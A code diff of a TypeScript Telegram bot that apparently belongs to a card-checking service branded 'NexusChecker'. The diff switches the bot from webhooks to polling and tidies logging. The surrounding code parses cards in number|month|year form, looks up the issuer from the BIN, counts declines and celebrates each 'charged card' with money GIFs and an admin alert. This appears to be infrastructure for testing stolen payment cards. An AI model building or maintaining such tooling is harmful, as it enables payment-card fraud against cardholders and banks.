@@ -29,7 +29,6 @@ interface TelegramUpdate {
 const processedUpdates = new Set<number>();
 const MAX_PROCESSED_UPDATES = 1000;
 let botInitialized = false;
-let webhookSet = false;
 
 function cleanupProcessedUpdates() {
   if (processedUpdates.size > MAX_PROCESSED_UPDATES) {
@@ -237,14 +236,13 @@ Declined: ${user.totalRejected}
 
 // Anime GIF URLs for card notifications
 const ANIME_GIFS = [
-  'https://media.giphy.com/media/3o7abKhOpu0NwenH3O/giphy.gif', // Money rain
-  'https://media.giphy.com/media/g9582DNuQppxC/giphy.gif', // Excited
-  'https://media.giphy.com/media/l0MYGb1LuZ3n7dRnO/giphy.gif', // Celebration
-  'https://media.giphy.com/media/3oriO0OEd9QIDdllqo/giphy.gif', // Money
-  'https://media.giphy.com/media/l378bu6ZYmzS6nBGo/giphy.gif', // Success
+  'https://media.giphy.com/media/3o7abKhOpu0NwenH3O/giphy.gif',
+  'https://media.giphy.com/media/g9582DNuQppxC/giphy.gif',
+  'https://media.giphy.com/media/l0MYGb1LuZ3n7dRnO/giphy.gif',
+  'https://media.giphy.com/media/3oriO0OEd9QIDdllqo/giphy.gif',
+  'https://media.giphy.com/media/l378bu6ZYmzS6nBGo/giphy.gif',
 ];
 
-// Get card scheme from BIN
 function getCardScheme(bin: string): string {
   const firstDigit = bin[0];
   const firstTwo = bin.substring(0, 2);
@@ -259,7 +257,6 @@ function getCardScheme(bin: string): string {
   return 'UNKNOWN';
 }
 
-// Country emoji flags
 const countryFlags: Record<string, string> = {
   'US': '🇺🇸', 'CA': '🇨🇦', 'UK': '🇬🇧', 'GB': '🇬🇧', 'AU': '🇦🇺',
   'DE': '🇩🇪', 'FR': '🇫🇷', 'IT': '🇮🇹', 'ES': '🇪🇸', 'NL': '🇳🇱',
@@ -305,11 +302,6 @@ export async function sendChargedCardNotification(
   
   const cardParts = card.split('|');
   const bin = cardParts[0]?.substring(0, 6) || '';
-  const lastFour = cardParts[0]?.slice(-4) || '';
-  const expMonth = cardParts[1] || 'XX';
-  const expYear = cardParts[2] || 'XX';
-  
-  // Get card scheme
   const scheme = binInfo?.brand || getCardScheme(bin);
   const cardType = binInfo?.type || 'UNKNOWN';
   const bank = binInfo?.bank || 'Unknown Bank';
@@ -317,7 +309,6 @@ export async function sendChargedCardNotification(
   const country = binInfo?.country || 'United States';
   const flag = countryFlags[countryCode] || '🌍';
   
-  // Random anime GIF
   const gifUrl = ANIME_GIFS[Math.floor(Math.random() * ANIME_GIFS.length)];
   
   const notificationText = `
@@ -340,14 +331,11 @@ export async function sendChargedCardNotification(
 <b>⚡ Powered by NexusChecker</b>
   `;
   
-  // Send with anime GIF
   const gifSent = await sendAnimation(userTelegramId, gifUrl, notificationText);
   if (!gifSent) {
-    // Fallback to text message if GIF fails
     await sendMessage(userTelegramId, notificationText);
   }
   
-  // Send to admin too
   if (ADMIN_ID && ADMIN_ID !== userTelegramId) {
     const adminText = `
 <b>🔔 NEW CHARGE DETECTED</b>
@@ -385,7 +373,7 @@ async function sendMessage(chatId: number | string, text: string): Promise<boole
     });
     return response.ok;
   } catch (error) {
-    console.error('Error sending message:', error);
+    console.error('[BOT] Error sending message:', error);
     return false;
   }
 }
@@ -413,77 +401,8 @@ async function sendMessageWithButton(chatId: number | string, text: string, butt
     });
     return response.ok;
   } catch (error) {
-    console.error('Error sending message with button:', error);
+    console.error('[BOT] Error sending message with button:', error);
     return false;
-  }
-}
-
-export async function setWebhook(webhookUrl: string): Promise<boolean> {
-  if (webhookSet) {
-    console.log('[BOT] Webhook already set, skipping');
-    return true;
-  }
-  
-  try {
-    console.log(`[BOT] Attempting to set webhook to: ${webhookUrl}`);
-    const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/setWebhook`, {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ 
-        url: webhookUrl,
-        drop_pending_updates: true,
-        allowed_updates: ['message']
-      }),
-    });
-    const result = await response.json();
-    console.log('[BOT] Webhook set result:', result);
-    webhookSet = response.ok;
-    return response.ok;
-  } catch (error) {
-    console.error('[BOT] Error setting webhook:', error);
-    return false;
-  }
-}
-
-export async function deleteWebhook(): Promise<boolean> {
-  try {
-    const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/deleteWebhook`, {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ drop_pending_updates: true }),
-    });
-    webhookSet = false;
-    return response.ok;
-  } catch (error) {
-    console.error('[BOT] Error deleting webhook:', error);
-    return false;
-  }
-}
-
-export async function initBot(): Promise<void> {
-  if (!BOT_TOKEN) {
-    console.log('[BOT] No token configured, skipping bot initialization');
-    return;
-  }
-
-  if (botInitialized) {
-    console.log('[BOT] Already initialized, skipping');
-    return;
-  }
-
-  botInitialized = true;
-  const isProduction = process.env.NODE_ENV === 'production' || process.env.REPL_SLUG;
-  const hasPublicDomain = !!process.env.RAILWAY_PUBLIC_DOMAIN || !!process.env.REPL_SLUG;
-
-  if (isProduction && hasPublicDomain) {
-    console.log(`[BOT] Production mode - using webhook (Domain: ${WEBAPP_URL})`);
-    const webhookUrl = `${WEBAPP_URL}/api/telegram/webhook`;
-    console.log(`[BOT] Setting webhook URL: ${webhookUrl}`);
-    await setWebhook(webhookUrl);
-  } else {
-    console.log('[BOT] Development mode - using polling');
-    await deleteWebhook();
-    startPolling();
   }
 }
 
@@ -493,11 +412,21 @@ let lastUpdateId = 0;
 async function getUpdates(): Promise<TelegramUpdate[]> {
   try {
     const response = await fetch(
-      `https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=${lastUpdateId + 1}&timeout=30`,
+      `https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=${lastUpdateId + 1}&timeout=30&allowed_updates=message`,
       { method: 'GET' }
     );
-    const data = await response.json() as { ok: boolean; result?: TelegramUpdate[] };
-    if (data.ok && data.result) {
+    const data = await response.json() as { ok: boolean; result?: TelegramUpdate[]; error_code?: number; description?: string };
+    
+    if (!data.ok) {
+      if (data.error_code === 401) {
+        console.error('[BOT] CRITICAL: Invalid Bot Token! Check TELEGRAM_BOT_TOKEN environment variable.');
+      } else {
+        console.error(`[BOT] Error getting updates: ${data.description}`);
+      }
+      return [];
+    }
+    
+    if (data.result) {
       return data.result;
     }
     return [];
@@ -513,13 +442,17 @@ function startPolling(): void {
     return;
   }
 
-  console.log('[BOT] Starting polling...');
+  console.log('[BOT] ✅ Starting Polling mode (checking for updates every 30 seconds)');
   pollingActive = true;
   
   const poll = async () => {
     while (pollingActive) {
       try {
         const updates = await getUpdates();
+        if (updates.length > 0) {
+          console.log(`[BOT] Received ${updates.length} update(s)`);
+        }
+        
         for (const update of updates) {
           lastUpdateId = Math.max(lastUpdateId, update.update_id);
           try {
@@ -536,7 +469,46 @@ function startPolling(): void {
   };
 
   poll().catch(console.error);
-  console.log('[BOT] Polling started');
+}
+
+export async function initBot(): Promise<void> {
+  if (!BOT_TOKEN) {
+    console.log('[BOT] ❌ No token configured, skipping bot initialization');
+    return;
+  }
+
+  if (botInitialized) {
+    console.log('[BOT] Already initialized, skipping');
+    return;
+  }
+
+  botInitialized = true;
+  
+  console.log('[BOT] 🤖 Initializing Telegram Bot (using Polling mode)');
+  console.log(`[BOT] Webhook URL available at: https://web-production-544bb.up.railway.app/api/telegram/webhook`);
+  
+  // Always use polling - more reliable than webhook
+  await deleteWebhook();
+  startPolling();
+}
+
+export async function deleteWebhook(): Promise<boolean> {
+  try {
+    console.log('[BOT] Deleting any existing webhook...');
+    const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/deleteWebhook`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ drop_pending_updates: false }),
+    });
+    
+    if (response.ok) {
+      console.log('[BOT] ✅ Webhook deleted, switched to polling mode');
+    }
+    return response.ok;
+  } catch (error) {
+    console.error('[BOT] Error deleting webhook:', error);
+    return false;
+  }
 }
 
 export function stopPolling(): void {
